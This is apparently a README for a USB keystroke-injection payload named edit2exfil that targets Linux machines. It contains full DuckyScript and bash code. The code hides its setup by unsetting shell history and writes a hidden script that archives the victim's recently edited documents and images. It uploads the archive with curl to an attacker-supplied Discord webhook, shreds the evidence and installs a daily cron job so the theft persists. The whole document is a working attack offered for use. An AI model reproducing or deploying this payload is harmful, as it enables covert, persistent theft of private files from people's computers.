==========================================================================================

REM TITLE: edit2exfil

REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)

REM TARGET OS: Linux (tested on Kali Linux Release 2025-W19)

REM DESCRIPTION: (See below)

REM REQUIREMENTS: Place Discord webhook in the #WEBHOOK_URL constant on line 10 | Place the USER of the target system in the #USER constant on line 11 | Timing of when and how frequent the script will be ran can be changed in line 53.

==========================================================================================

## edit2exfil

edit2exfil is a persistent file exfiltration payload that embeds itself as a `cronjob` on Linux systems via bash script, running silently in the background allowing for persistent exfiltration of updated files.

**The payload builds a bash script (.e2e.sh) that performs multiple tasks in the following order:**

1. a `net_check` conditional statement is utilized to see if the machine has internet connectivity. This is acheived by sending a `PING` to [Hak5.org](https://hak5.org). If `PING` was **NOT** successful, the script exits and will be ran again in 24 hours (or the next scheduled time). If the `PING` **WAS** successful, the script moves to a secondary conditional statement >
2. a `file_check` conditional statement is utilized to see if the following document file types have been modified (edited) in the past 24 hours: `.txt, .pdf, .docx, .doc, .csv, .xlsx, .png", .jpg", .jpeg", .sh"`. If there are **NOT** any documents (with the previous file types) that have been modified in the past 24 hours, the script exits and will be ran again in 24 hours (or the next scheduled time), else >
3. The files are tarballed (.loot.tar.gz) and placed (hidden) in the home directory for exfiltration >
4. The tarball is then exfiltrated via Discord webhook >
5. The tarball is then `shredded` to obfuscate its' presence >
6. fi (end of script)

This allows for persistent data exfiltration of files as they are updated daily.

Total time for DuckyScript payload to run (including building bash script): `7 seconds`.

**DuckyScript Payload Workflow:**
  - Terminal window is opened.
  - Terminal history is unset (to obfuscate building of the payloads' bash script (.e2e.sh) > bash script is built and hidden (due to prepending with . in home directory).
  - Execution permissions are given to .e2e.sh > .e2e.sh is added to `cronjob` to automatically run silently in the bachkground daily at 10:00 AM.
  - Terminal window is closed.

**Payload Bash Script (.e2e.sh):**
```
# Creating file_check function to see if the listed filetypes (and their respective documents) have been modified (edited) in the past 24 hours:
file_check() {
    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | grep -q . 
}

# Creating hidden tarball function to tarball the listed documents (of the respective filetypes) that have been modified (edited) in the past 24 hours:
tarball() {
    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | tar -czf ~/.loot.tar.gz --null -T -
}

# Creating net_check function to check for internet connectivity by send a PING to hak5.org:
net_check() {
    ping -c 1 hak5.org
}

# If internet connection, check for files, if files, tarball, else exit:
if net_check; then
    if file_check; then
        tarball
    else
        :
    fi
else
    :
fi

# Exfiltrate tarball of found files to Discord:
curl -X POST -H "Content-Type: multipart/form-data" \
-F "file=@/home/#USER/.loot.tar.gz" \
-F "content=$ Loot Incoming $" \
#WEBHOOK_URL

# Shred the tarball post exfiltration to obfuscate:
shred -fuz ~/.loot.tar.gz
```

**DuckyScript Payload (building of above script):**
```
REM Place Discord webhook and user constants:
DEFINE #WEBHOOK_URL https://discord.com/api/webhooks/PLACE/WEBHOOK/HERE
DEFINE #USER PLACE_USER_HERE

REM Begin attack:
ATTACKMODE HID
DELAY 1000

REM Opening terminal:
CTRL ALT t
DELAY 300

REM Unsetting terminal history and building ".e2e.sh":
STRINGLN unset HISTFILE
STRINGLN cat > .e2e.sh
STRINGLN
file_check() {
    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | grep -q . 
}
tarball() {
    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | tar -czf ~/.loot.tar.gz --null -T -
}
net_check() {
    ping -c 1 hak5.org
}

if net_check; then
    if file_check; then
        tarball
    else
        :
    fi
else
    :
fi
curl -X POST -H "Content-Type: multipart/form-data" \
-F "file=@/home/#USER/.loot.tar.gz" \
-F "content=$ Loot Incoming $" \
#WEBHOOK_URL
shred -fuz ~/.loot.tar.gz
END_STRINGLN
CTRL c

REM Granting execution permissions and adding ".e2e.sh" to cronjob to be executed at 10:00 AM, daily:
STRINGLN chmod +x .e2e.sh && (crontab -l; echo "0 10 * * * ~/.e2e.sh") | crontab - && exit
```
